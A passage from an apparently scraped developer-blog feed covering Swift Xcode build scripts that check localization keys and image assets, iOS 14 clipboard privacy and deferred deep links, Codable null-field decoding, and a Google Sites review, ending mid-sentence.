\"\\(path)/\\(masterLocalizationFile.name).lproj/Localizable.strings:\\(masterLocalizationFile.linesNumbers[v]!): \" str += \"error: [Unused Key] \\\"\\(v)\\\" is never used\" print(str) numberOfErrors += 1 if counter != 0 { replaceCommand += \"\\\\|\" } replaceCommand += v if counter == unused.count - 1 { replaceCommand += \")\\\" = \\\".*\\\";\" } counter += 1}print(replaceCommand)// MARK: - Compare each translation file against master (en)for file in localizationFiles { for k in masterLocalizationFile.keyValue.keys { if file.keyValue[k] == nil { var str = \"\\(path)/\\(file.name).lproj/Localizable.strings:\\(masterLocalizationFile.linesNumbers[k]!): \" str += \"error: [Missing] \\\"\\(k)\\\" missing from \\(file.name.uppercased()) file\" print(str) numberOfErrors += 1 } } let redundantKeys = file.keyValue.keys.filter { !masterLocalizationFile.keyValue.keys.contains($0) } for k in redundantKeys { let str = \"\\(path)/\\(file.name).lproj/Localizable.strings:\\(file.linesNumbers[k]!): \" + \"error: [Redundant key] \\\"\\(k)\\\" redundant in \\(file.name.uppercased()) file\" print(str) }}if checkForUntranslated { for key in untranslated { var str = \"\\(path)/\\(masterLocalizationFile.name).lproj/Localizable.strings:1: \" str += \"error: [Missing Translation] \\(key) is not translated\" print(str) numberOfErrors += 1 }}print(\"Number of warnings : \\(numberOfWarnings)\")print(\"Number of errors : \\(numberOfErrors)\")if numberOfErrors &gt; 0 { exit(1)}func shell(_ command: String) -&gt; String { let task = Process() let pipe = Pipe() task.standardOutput = pipe task.arguments = [\"-c\", command] task.launchPath = \"/bin/bash\" task.launch() let data = pipe.fileHandleForReading.readDataToEndOfFile() let output = String(data: data, encoding: .utf8)! return output} Finally, finally, it‚Äôs not over yet!After we finish debugging our Swift inspection tool scripts, we need to compile them into executables to reduce build time; otherwise, each build will recompile them (which can save about 90% of the time).Open the terminal, navigate to the directory containing the tool script in the project, and run:swiftc -o Localize Localize.swiftThen go back to Build Phases and change the Script content path to the executable file.EX: ${SRCROOT}/LocalizeCompleted!Tool 2. Asset Checker üëÆ Image Asset Checker ToolFunction: Automatic Check During Build Check missing images: The name is referenced, but the image resource folder does not contain it. Check for redundant images: names not used, but present in the image resource directory Installation Method: Download the Swift Script file for the tool Place it in the project directory, e.g., ${SRCROOT}/AssetChecker.swift Open Project Settings ‚Üí iOS Target ‚Üí Build Phases ‚Üí Top left ‚Äú+‚Äù ‚Üí New Run Script Phase ‚Üí Paste the path in the Script content ${SRCROOT}/AssetChecker.swift ${SRCROOT}/ProjectDirectory ${SRCROOT}/Resources/Images.xcassets//${SRCROOT}/Resources/Images.xcassets = The location of your .xcassetsYou can directly include the setting parameters in the path: Parameter 1 is the project directory location, Parameter 2 is the image resource directory location; or edit the parameter setting block at the top of AssetChecker.swift like the localization checking tool:// Configure me \\o/// Project directory location (used to check if images are referenced in the code)var sourcePathOption:String? = nil// .xcassets directory locationvar assetCatalogPathOption:String? = nil// Unused warning ignore listlet ignoredUnusedNames = [String]() Build! Success!Check Result Prompt Type: Build Error ‚ùå : [Asset Missing] The item is referenced in the code but missing from the image asset directory Build Warning ‚ö†Ô∏è : [Asset Unused] The item is not used in the code but exists in the image resource directoryp.s If the image is provided by a dynamic variable, the inspection tool cannot detect it. You can add it to ignoredUnusedNames as an exception. Other operations are the same as language checking tools, so they won‚Äôt be repeated here; the most important thing is to remember to compile into an executable after debugging, and change the run script to use the executable!Develop Your Own Tools! We can refer to the image resource inspection tool script:#!/usr/bin/env xcrun --sdk macosx swiftimport Foundation// Configure me \\o/var sourcePathOption:String? = nilvar assetCatalogPathOption:String? = nillet ignoredUnusedNames = [String]()for (index, arg) in CommandLine.arguments.enumerated() { switch index { case 1: sourcePathOption = arg case 2: assetCatalogPathOption = arg default: break }}guard let sourcePath = sourcePathOption else { print(\"AssetChecker:: error: Source path was missing!\") exit(0)}guard let assetCatalogAbsolutePath = assetCatalogPathOption else { print(\"AssetChecker:: error: Asset Catalog path was missing!\") exit(0)}print(\"Searching sources in \\(sourcePath) for assets in \\(assetCatalogAbsolutePath)\")/* Put here the asset generating false positives, For instance when you build asset names at runtimelet ignoredUnusedNames = [ \"IconArticle\", \"IconMedia\", \"voteEN\", \"voteES\", \"voteFR\"] */// MARK : - End Of Configurable Sectionfunc elementsInEnumerator(_ enumerator: FileManager.DirectoryEnumerator?) -&gt; [String] { var elements = [String]() while let e = enumerator?.nextObject() as? String { elements.append(e) } return elements}// MARK: - List Assetsfunc listAssets() -&gt; [String] { let extensionName = \"imageset\" let enumerator = FileManager.default.enumerator(atPath: assetCatalogAbsolutePath) return elementsInEnumerator(enumerator) .filter { $0.hasSuffix(extensionName) } // Is Asset .map { $0.replacingOccurrences(of: \".\\(extensionName)\", with: \"\") } // Remove extension .map { $0.components(separatedBy: \"/\").last ?? $0 } // Remove folder path}// MARK: - List Used Assets in the codebasefunc localizedStrings(inStringFile: String) -&gt; [String] { var localizedStrings = [String]() let namePattern = \"([\\\\w-]+)\" let patterns = [ \"#imageLiteral\\\\(resourceName: \\\"\\(namePattern)\\\"\\\\)\", // Image Literal \"UIImage\\\\(named:\\\\s*\\\"\\(namePattern)\\\"\\\\)\", // Default UIImage call (Swift) \"UIImage imageNamed:\\\\s*\\\\@\\\"\\(namePattern)\\\"\", // Default UIImage call \"\\\\&lt;image name=\\\"\\(namePattern)\\\".*\", // Storyboard resources \"R.image.\\(namePattern)\\\\(\\\\)\" //R.swift support ] for p in patterns { let regex = try? NSRegularExpression(pattern: p, options: []) let range = NSRange(location:0, length:(inStringFile as NSString).length) regex?.enumerateMatches(in: inStringFile,options: [], range: range) { result, _, _ in if let r = result { let value = (inStringFile as NSString).substring(with:r.range(at: 1)) localizedStrings.append(value) } } } return localizedStrings}func listUsedAssetLiterals() -&gt; [String] { let enumerator = FileManager.default.enumerator(atPath:sourcePath) print(sourcePath) #if swift(&gt;=4.1) return elementsInEnumerator(enumerator) .filter { $0.hasSuffix(\".m\") \\\\|\\\\| $0.hasSuffix(\".swift\") \\\\|\\\\| $0.hasSuffix(\".xib\") \\\\|\\\\| $0.hasSuffix(\".storyboard\") } // Only Swift and Obj-C files .map { \"\\(sourcePath)/\\($0)\" } // Build file paths .map { try? String(contentsOfFile: $0, encoding: .utf8)} // Get file contents .compactMap{$0} .compactMap{$0} // Remove nil entries .map(localizedStrings) // Find localizedStrings occurrences .flatMap{$0} // Flatten #else return elementsInEnumerator(enumerator) .filter { $0.hasSuffix(\".m\") \\\\|\\\\| $0.hasSuffix(\".swift\") \\\\|\\\\| $0.hasSuffix(\".xib\") \\\\|\\\\| $0.hasSuffix(\".storyboard\") } // Only Swift and Obj-C files .map { \"\\(sourcePath)/\\($0)\" } // Build file paths .map { try? String(contentsOfFile: $0, encoding: .utf8)} // Get file contents .flatMap{$0} .flatMap{$0} // Remove nil entries .map(localizedStrings) // Find localizedStrings occurrences .flatMap{$0} // Flatten #endif}// MARK: - Beginning of scriptlet assets = Set(listAssets())let used = Set(listUsedAssetLiterals() + ignoredUnusedNames)// Generate Warnings for Unused Assetslet unused = assets.subtracting(used)unused.forEach { print(\"\\(assetCatalogAbsolutePath):: warning: [Asset Unused] \\($0)\") }// Generate Error for broken Assetslet broken = used.subtracting(assets)broken.forEach { print(\"\\(assetCatalogAbsolutePath):: error: [Asset Missing] \\($0)\") }if broken.count &gt; 0 { exit(1)}Compared to language check scripts, this script is concise and includes all essential functions, making it very valuable as a reference!P.S You can see the code uses the name localizedStrings(). I suspect the author copied the logic from a localization checking tool and forgot to rename the method XDFor example:for (index, arg) in CommandLine.arguments.enumerated() { switch index { case 1: // Argument 1 case 2: // Argument 2 default: break }}^Method to receive external parametersfunc elementsInEnumerator(_ enumerator: FileManager.DirectoryEnumerator?) -&gt; [String] { var elements = [String]() while let e = enumerator?.nextObject() as? String { elements.append(e) } return elements}func localizedStrings(inStringFile: String) -&gt; [String] { var localizedStrings = [String]() let namePattern = \"([\\\\w-]+)\" let patterns = [ \"#imageLiteral\\\\(resourceName: \\\"\\(namePattern)\\\"\\\\)\", // Image Literal \"UIImage\\\\(named:\\\\s*\\\"\\(namePattern)\\\"\\\\)\", // Default UIImage call (Swift) \"UIImage imageNamed:\\\\s*\\\\@\\\"\\(namePattern)\\\"\", // Default UIImage call \"\\\\&lt;image name=\\\"\\(namePattern)\\\".*\", // Storyboard resources \"R.image.\\(namePattern)\\\\(\\\\)\" //R.swift support ] for p in patterns { let regex = try? NSRegularExpression(pattern: p, options: []) let range = NSRange(location:0, length:(inStringFile as NSString).length) regex?.enumerateMatches(in: inStringFile,options: [], range: range) { result, _, _ in if let r = result { let value = (inStringFile as NSString).substring(with:r.range(at: 1)) localizedStrings.append(value) } } } return localizedStrings}func listUsedAssetLiterals() -&gt; [String] { let enumerator = FileManager.default.enumerator(atPath:sourcePath) print(sourcePath) #if swift(&gt;=4.1) return elementsInEnumerator(enumerator) .filter { $0.hasSuffix(\".m\") \\\\|\\\\| $0.hasSuffix(\".swift\") \\\\|\\\\| $0.hasSuffix(\".xib\") \\\\|\\\\| $0.hasSuffix(\".storyboard\") } // Only Swift and Obj-C files .map { \"\\(sourcePath)/\\($0)\" } // Build file paths .map { try? String(contentsOfFile: $0, encoding: .utf8)} // Get file contents .compactMap{$0} .compactMap{$0} // Remove nil entries .map(localizedStrings) // Find localizedStrings occurrences .flatMap{$0} // Flatten #else return elementsInEnumerator(enumerator) .filter { $0.hasSuffix(\".m\") \\\\|\\\\| $0.hasSuffix(\".swift\") \\\\|\\\\| $0.hasSuffix(\".xib\") \\\\|\\\\| $0.hasSuffix(\".storyboard\") } // Only Swift and Obj-C files .map { \"\\(sourcePath)/\\($0)\" } // Build file paths .map { try? String(contentsOfFile: $0, encoding: .utf8)} // Get file contents .flatMap{$0} .flatMap{$0} // Remove nil entries .map(localizedStrings) // Find localizedStrings occurrences .flatMap{$0} // Flatten #endif}^Method to Traverse All Project Files and Perform Regex Matching// To make an Error ‚ùå appear during build:print(\"ProjectFile.lproj\" + \"/file:line: \" + \"error: error message\")// To make a Warning ‚ö†Ô∏è appear during build:print(\"ProjectFile.lproj\" + \"/file:line: \" + \"warning: warning message\")^print error or warningYou can combine the above programming methods to create the tool you want.SummaryAfter introducing these two inspection tools, we can develop with more confidence, greater efficiency, and less redundancy. This experience has been eye-opening, and in the future, any new build run script requirements can be created directly using the most familiar language, Swift!If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS Clipboard Privacy ConcernsÔΩúBalancing Security and Convenience", "url": "/posts/zrealm-dev/ios-clipboard-privacy-concerns-balancing-security-and-convenience-8a04443024e2/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios, ios-app-development, ios-14, hacking, security", "date": "2020-07-02 21:51:36 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS 14 Clipboard Data Theft Panic: The Privacy vs. Convenience DilemmaWhy Do S...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS 14 Clipboard Data Theft Panic: The Privacy vs. Convenience DilemmaWhy Do So Many iOS Apps Read Your Clipboard?Photo by Clint Patterson‚ö†Ô∏è 2022/07/22 Update: iOS 16 Upcoming ChangesStarting from iOS 16, if the paste action is not initiated by the user, the app‚Äôs active reading of the clipboard will trigger a prompt. The user must allow it for the app to access the clipboard data.UIPasteBoard‚Äôs privacy change in iOS 16IssueTop notification message when the clipboard is accessed by an appStarting with iOS 14, users are notified when an app reads their clipboard. Apps from mainland China have a notorious reputation, and media coverage has amplified privacy concerns. However, it‚Äôs not just Chinese apps; many apps from the US, Taiwan, Japan, and around the world have been caught. So why do so many apps need to read the clipboard?Google SearchSecurityThe clipboard may contain personal privacy information or even passwords, such as when copying passwords from password managers like 1Password or LastPass. If an app can read the clipboard, it can also send that data back to a server. It all depends on the developer‚Äôs integrity. To investigate, you can use man-in-the-middle sniffing to monitor whether the app sends clipboard data back to the server.BackgroundClipboard API has been available since iOS 3 in 2009. However, starting from iOS 14, users receive additional prompts notifying them. Over the past decade, malicious apps could have already collected enough data.WhyWhy do so many apps, both domestic and international, read the clipboard when opened?Here, I need to clarify that the situation I‚Äôm referring to is ‚Äúwhen the APP is opened,‚Äù not reading the clipboard while the APP is in use; reading the clipboard during app use is more related to in-app features, like Google Maps automatically pasting a recently copied address, though some apps might continuously steal clipboard data. ‚ÄúA kitchen knife can be used to cut vegetables or to kill, depending on how the person uses it.‚ÄùThe main reason the app reads the clipboard on launch is to implement iOS Deferred Deep Link to enhance user experience, as shown in the above process. When a product offers both a website and an app, we prefer users to install the app (due to higher engagement). Therefore, when users browse the web version, they are guided to download the app, and we want the app to automatically open the page they left off on when launched after installation. EX: When I browse the PxHome mobile website on Safari -&gt; see a product I like and want to buy -&gt; PxHome wants to drive traffic to the APP -&gt; download the APP -&gt; open the APP -&gt; display the product I just saw on the websiteIf this is not done, users can only 1. go back to the webpage and click again, or 2. search for the product again within the app; both options increase the difficulty and hesitation time for users to make a purchase, which may lead to them not buying at all!On the other hand, from an operational perspective, knowing the statistics of successful installs by source greatly aids marketing and advertising budget allocation.Why must we use the clipboard? Are there any alternatives?This is a cat-and-mouse game because iOS itself does not want developers to reverse-track user sources. Before iOS 9, the method was to store information in web cookies, then read the cookies after the app was installed. After iOS 10, Apple blocked this method. With no other options left, everyone resorted to the final technique ‚Äî ‚Äútransmitting information via the clipboard.‚Äù iOS 14 introduced a new move again, notifying users and putting developers in an awkward position.Another approach is to use Branch.io to track user profiles (IP, device information), then merge the data for retrieval. This method is feasible in principle but requires significant manpower (involving backend, database, and app development) for research and implementation, and it may result in misjudgments or collisions. The Android Google app natively supports this feature, no workaround needed like on iOS.Affected AppsMany app developers may not realize they also have clipboard privacy issues because Google‚Äôs Firebase Dynamic Links service works on the same principle:// This string ensures that only FDL links copied to the clipboard by the AppPreview Page// JavaScript code are recognized and used in the copy-unique-match process. If the user// copies the FDL to the clipboard manually, that link must not be used in the copy-unique-match process.// This constant must be kept in sync with the constant in the server version at// durabledeeplink/click/ios/click_page.js So any app using Google Firebase Dynamic Links service may be affected by clipboard privacy issues!Personal ViewpointSecurity issues do exist, but it comes down to trust‚Äîtrusting that developers use it for the right purposes. If developers intend to do harm, there are many easier ways to do so, such as stealing credit card information or recording actual passwords, which are far more effective than this. The purpose of the prompt is to alert users when the clipboard is being accessed; if the timing seems unusual, they should be cautious!Reader‚Äôs QuestionQ: Is the statement ‚ÄúTikTok accesses the clipboard to detect spam behavior‚Äù accurate?A: I personally think it‚Äôs just an excuse to appease public opinion. Douyin probably means ‚Äúto prevent users from copying and pasting ads everywhere.‚Äù But in reality, blocking or filtering can be done when the message is completed or sent. There‚Äôs no need to constantly monitor the user‚Äôs clipboard! Should they also control ads or ‚Äúsensitive‚Äù content in the clipboard? I haven‚Äôt pasted or posted anything.What Developers Can DoIf you don‚Äôt have a spare device to upgrade to iOS 14 for testing, you can first try using the simulator by downloading XCode 12 from Apple.Everything is still too new. If you are integrating Firebase, you can first refer to Firebase-iOS-SDK/Issue #5893 and update to the latest SDK.If you implement DeepLink yourself, you can refer to the Firebase-iOS-SDK #PR 5905 modification:Swift:if #available(iOS 10.0, *) { if (UIPasteboard.general.hasURLs) { //UIPasteboard.general.string }} else { //UIPasteboard.general.string}Objective-C:if (@available(iOS 10.0, *)) { if ([[UIPasteboard generalPasteboard] hasURLs]) { //[UIPasteboard generalPasteboard].string; } } else { //[UIPasteboard generalPasteboard].string; } return pasteboardContents;}First check if the clipboard content is a URL (matching the copied content from the webpage JavaScript which includes URL parameters) before reading it. This prevents the clipboard from being read every time the app is opened. This is the only way for now. The prompt will still jump, but this just makes it more focused.Apple has also added a new API: DetectPattern, which helps developers more accurately determine if the clipboard content is what they need before reading it and showing prompts. This makes users feel more secure and allows developers to continue using this feature. DetectPattern is still in Beta and can only be implemented using Objective-C.Or‚Ä¶ Switch to Branch.io Implement the Principle of Branch.io by Yourself The app first displays a customized alert to inform the user, then reads the clipboard (to reassure the user) Add new privacy policy terms iOS 14 Latest App Clips? From Web -&gt; Launch Lightweight App Clips -&gt; In-depth APP Operation Further Reading iOS Deferred Deep Link Implementation (Swift) iOS+MacOS Using mitmproxy for Man-in-the-Middle Sniffing iOS 15 / MacOS Monterey Safari Will Hide Real IP If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Codable Decode Issues ExplainedÔΩúHandling Null Response Fields Without Rewriting init Decoder", "url": "/posts/zrealm-dev/codable-decode-issues-explained-handling-null-response-fields-without-rewriting-init-decoder-cb00b1977537/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios, ios-app-development, codable, json, core-data", "date": "2020-06-26 01:56:31 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Real-World Codable Decoding Issues Summary (Part 2)Properly handling Response ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Real-World Codable Decoding Issues Summary (Part 2)Properly handling Response Null fields does not always require rewriting the init decoder.Photo by ZanIntroductionFollowing the previous article ‚ÄúPractical Issues Encountered with Codable Decoding,‚Äù development has progressed further, bringing new scenarios and challenges. This follow-up continues to document the situations encountered and the research process for future reference.The previous article mainly addressed JSON String -&gt; Entity Object Decodable Mapping. With the Entity Object, we can convert it into a Model Object for use within the program, a View Model Object to handle data display logic, and so on; on the other hand, we need to convert the Entity into an NSManagedObject to store it locally in Core Data.Main IssuesAssuming our song Entity structure is as follows:struct Song: Decodable { var id: Int var name: String? var file: String? var converImage: String? var likeCount: Int? var like: Bool? var length: Int?}Since the API EndPoint may not always return complete data fields (only the id is guaranteed), all fields except for id are optional. For example, when fetching song information, the full structure is returned, but when liking or favoriting a song, only the three related fields id, likeCount, and like are returned.We want all fields from the API response to be saved into Core Data. If the data already exists, update only the changed fields (incremental update). But here comes the problem: after converting Codable Decode to Entity Object, we cannot distinguish between ‚Äúthe data field is intended to be set to nil‚Äù and ‚Äúthe response did not provide it‚ÄùA Response:{ \"id\": 1, \"file\": null}For both A Response and B Response, the file is null, but their meanings are different; A intends to set the file field to null (clearing the original data), while B intends to update other data and simply does not provide the file field. The Swift community has developers proposing adding a null Strategy similar to date Strategy in JSONDecoder, allowing us to distinguish the above situations, but there are currently no plans to add it.SolutionAs mentioned earlier, our architecture is JSON String -&gt; Entity Object -&gt; NSManagedObject, so when we get the Entity Object, it is already the decoded result, and there is no raw data to manipulate; of course, we can use the original JSON String for comparison here, but rather than doing that, it‚Äôs better not to use Codable.First, refer to the previous article for using Associated Value Enum as a container to hold values.enum OptionalValue&lt;T: Decodable&gt;: Decodable { case null case value(T) init(from decoder: Decoder) throws { let container = try decoder.singleValueContainer() if let value = try? container.decode(T.self) { self = .value(value) } else { self = .null } }}Using generics, T represents the actual data field type; .value(T) holds the decoded value, while .null indicates the value is null.struct Song: Decodable { enum CodingKeys: String, CodingKey { case id case file } var id: Int var file: OptionalValue&lt;String&gt;? init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) self.id = try container.decode(Int.self, forKey: .id) if container.contains(.file) { self.file = try container.decode(OptionalValue&lt;String&gt;.self, forKey: .file) } else { self.file = nil } }}var jsonData = \"\"\"{ \"id\":1}\"\"\".data(using: .utf8)!var result = try! JSONDecoder().decode(Song.self, from: jsonData)print(result)jsonData = \"\"\"{ \"id\":1, \"file\":null}\"\"\".data(using: .utf8)!result = try! JSONDecoder().decode(Song.self, from: jsonData)print(result)jsonData = \"\"\"{ \"id\":1, \"file\":\"https://test.com/m.mp3\"}\"\"\".data(using: .utf8)!result = try! JSONDecoder().decode(Song.self, from: jsonData)print(result) The example is simplified to only include two data fields: id and file.The Song Entity overrides the Decode method by itself, using the contains(.KEY) method to check if the Response includes the field (regardless of its value). If it exists, it decodes it into an OptionalValue; the OptionalValue Enum then attempts to decode the actual value we want. If decoding succeeds, it stores it as .value(T); if the value is null (or decoding fails), it stores it as .null. When Response has a field &amp; value: OptionalValue.value(VALUE) When the Response has a field &amp; value as null: OptionalValue.null Response when no field is given: nil This way, you can tell if a field is provided or not. When writing to Core Data later, you can decide whether to update the field to null or skip updating it.Other Studies ‚Äî Double Optional ‚ùåOptional! Optional! Swift is well suited to handle this scenario.struct Song: Decodable { var id: Int var name: String?? var file: String?? var converImage: String?? var likeCount: Int?? var like: Bool?? var length: Int??} When the Response includes a field &amp; value: Optional(VALUE) When the Response has a field &amp; value as null: Optional(nil) When Response does not provide a field: nil However‚Ä¶ Codable JSONDecoder Decode handles both Double Optional and Optional with decodeIfPresent, treating them as Optional, so the result remains the same.Other Research ‚Äî Property Wrapper ‚ùåOriginally planned to use Property Wrapper for elegant encapsulation, for example:@OptionalValue var file: String?But before diving into the details, I found that if a Codable property is marked with a Property Wrapper, the API response must include that field; otherwise, a keyNotFound error will occur, even if the field is Optional. ?????The official forum also has a discussion thread about this issue‚Ä¶ it is expected to be fixed later. When choosing packages like BetterCodable or CodableWrappers, you need to consider the current issues with Property Wrappers.Other Problem Scenarios1. How to Decode API Response Using 0/1 to Represent Bool?import Foundationstruct Song: Decodable { enum CodingKeys: String, CodingKey { case id case name case like } var id: Int var name: String? var like: Bool? init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) self.id = try container.decode(Int.self, forKey: .id) self.name = try container.decodeIfPresent(String.self, forKey: .name) if let intValue = try container.decodeIfPresent(Int.self, forKey: .like) { self.like = (intValue == 1) ? true : false } else if let boolValue = try container.decodeIfPresent(Bool.self, forKey: .like) { self.like = boolValue } }}var jsonData = \"\"\"{ \"id\": 1, \"name\": \"Âëä‰∫î‰∫∫\", \"like\": 0}\"\"\".data(using: .utf8)!var result = try! JSONDecoder().decode(Song.self, from: jsonData)print(result)Extending the previous article, we can decode into int/Bool ourselves in init Decode and assign the values manually. This way, the original field can accept 0/1/true/false.2. Avoid rewriting init decoder every timeExtending the original JSON Decoder to add more features without building a Decoder from scratch.We can extend KeyedDecodingContainer to define our own public methods. Swift will prioritize executing the methods we redefine in our module, overriding the original Foundation implementation. The entire module is affected. And it‚Äôs not a true override, so you can‚Äôt call super.decode. Be careful not to call yourself (e.g., decode(Bool.Type, for: key) inside decode(Bool.Type, for: key))There are two methods for decode: decode(Type, forKey:) Handling Non-Optional Data Fields decodeIfPresent(Type, forKey:) handles optional data fields Example 1. The main issue mentioned above can be directly extended:extension KeyedDecodingContainer { public func decodeIfPresent&lt;T&gt;(_ type: T.Type, forKey key: Self.Key) throws -&gt; T? where T : Decodable { //better: switch type { case is OptionalValue&lt;String&gt;.Type, is OptionalValue&lt;Int&gt;.Type: return try? decode(type, forKey: key) default: return nil } // or just return try? decode(type, forKey: key) }}struct Song: Decodable { var id: Int var file: OptionalValue&lt;String&gt;?}The main issue involves Optional data fields and Decodable types, so we override the decodeIfPresent&lt;T: Decodable&gt; method.Here it is translated according to your instructions:It is speculated that the original implementation of decodeIfPresent returns nil directly if the data is null or the Response does not provide it, without actually running decode.So the principle is simple: as long as the Decodable Type is OptionValue, we always try to decode it to get different state results; however, it's also fine not to check the Decodable Type, which means all Optional fields will attempt to decode.Example 2. Problem Scenario 1 can also be expanded using this method:extension KeyedDecodingContainer { public func decodeIfPresent(_ type: Bool.Type, forKey key: KeyedDecodingContainer&lt;K&gt;.Key) throws -&gt; Bool? { if let intValue = try? decodeIfPresent(Int.self, forKey: key) { return (intValue == 1) ? (true) : (false) } else if let boolValue = try? decodeIfPresent(Bool.self, forKey: key) { return boolValue } return nil }}struct Song: Decodable { enum CodingKeys: String, CodingKey { case id case name case like } var id: Int var name: String? var like: Bool?}var jsonData = \"\"\"{ \"id\": 1, \"name\": \"Âëä‰∫î‰∫∫\", \"like\": 1}\"\"\".data(using: .utf8)!var result = try! JSONDecoder().decode(Song.self, from: jsonData)print(result)ConclusionMost of the clever tricks for using Codable have been tried. Some are quite convoluted because Codable‚Äôs constraints are very strict, sacrificing much of the flexibility needed in real-world development. In the end, I even started questioning why I chose Codable in the first place, as its advantages seem to diminish over time‚Ä¶.References Maybe You Don‚Äôt Need to Rewrite the init(from:) MethodReview Real-World Codable Decode Issues Summary (Part 1)If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Google Site Personal WebsiteÔΩúModern Setup and Experience Guide", "url": "/posts/zrealm-life/google-site-personal-website-modern-setup-and-experience-guide-724a7fb9a364/", "categories": "ZRealm Life.", "tags": "english, ai-translation, google, google-sites, web-development, lifestyle, domain-names", "date": "2020-06-17 23:53:54 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Is Using Google Sites to Build a Personal Website Still Relevant Today?New Goo...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Is Using Google Sites to Build a Personal Website Still Relevant Today?New Google Site Personal Website Creation Experience and Setup GuideUpdate 2022‚Äì07‚Äì17I have used my own tool, ZMediumToMarkdown, to download and convert Medium articles into Markdown format for migration to Jekyll.zhgchg.li Step-by-step painless transfer tutorial click here üöÄüöÄüöÄüöÄüöÄ===OriginWhen I changed jobs last year, I somewhat frivolously registered a domain to serve as a personal resume link. After six months, I thought of making the domain more useful by adding more information. At the same time, I was looking for a second website to back up the articles I published on Medium, just in case.Expected Features Is there a custom page available? A smooth writing interface like Medium Interactive features (Like/Comment/Follow) Good SEO structure Lightweight and fast loading Can bind your own domain Low intrusiveness (Ad intrusiveness, website labeling) Easy to build Hosting Options Self-Hosted WordPressA long time ago, I rented hosting and a domain to set up a personal website using WordPress. After setting it up, customizing the layout to my liking, installing plugins, and even developing missing plugins myself, I lost the motivation to write. It felt bulky, and the loading speed and SEO were not as good as Medium. Spending more time tweaking it would only drain my energy for writing even further. Matters/ÁÆÄ‰π¶‚Ä¶ etc.Similar to the Medium platform, but since I don‚Äôt consider profitability, it‚Äôs not suitable. wix/weebly are too focused on business websites, and their free versions are too intrusive. Google Site (This Article) Github Pages + Jekyll Still looking¬†¬ª&gt; Suggestions are welcome About Google SiteAround 2010, I used the old version of Google Sites to create a personal website -&gt; a file download center page. My memory is a bit vague, but I only remember the layout was bulky and the interface was not smooth. After 10 years, I thought the service had been discontinued, but I accidentally saw some domain investors using it as a domain parking page with contact info for sale:At first glance, I thought, ‚ÄúWow! The visuals are nice, they even made a page just to sell a domain.‚Äù Looking closer at the bottom left corner‚Äôs watermark, I realized, ‚ÄúWow! This was built with Google Sites,‚Äù which is completely different from the interface I used 10 years ago. After checking, I found out Google Sites hasn‚Äôt stopped service; instead, it launched a new version in 2016. Although it‚Äôs been almost five years, at least the interface is now modern!Finished Product DisplayDon‚Äôt say anything yet, first check out the final product I made. If you also have a ‚Äúkindred spirit,‚Äù you might want to give it a try!HomePersonal Resume PageCity Corner (Waterfall Photo Layout)Table of Contents (link back to Medium)Contact Me (Embedded Google Form)Why not give it a try?To save reading time, here is my conclusion first; I am still looking for a better service option. Although it is continuously maintained and updated, Google Site fails to meet several key needs for me. Below are the critical drawbacks I encountered while using it.Fatal Flaws Code Highlighting LimitationsThe feature only provides a gray background for code blocks without color syntax highlighting. To embed a Gist, you must use Embed JavaScript (iframe), but Google Site does not handle this well. The height cannot adjust with page scaling, resulting in either excessive blank space or dual scroll bars on small mobile screens, which looks ugly and is hard to read. SEO structure is basically zero‚ÄúSurprised or not?‚Äù Google‚Äôs own service results have terrible SEO structure, offering no customization for head meta (description/tag/og:). Forget about SEO ranking; just sharing the site on Line/Facebook shows no preview info, only an ugly URL and site name. Advantages1. Low invasiveness, only a floating exclamation mark appears at the bottom left, and clicking it will display ‚ÄúGoogle Workspace Report Abuse‚Äù2. Easy Interface: Quickly Build Pages by Dragging Components on the 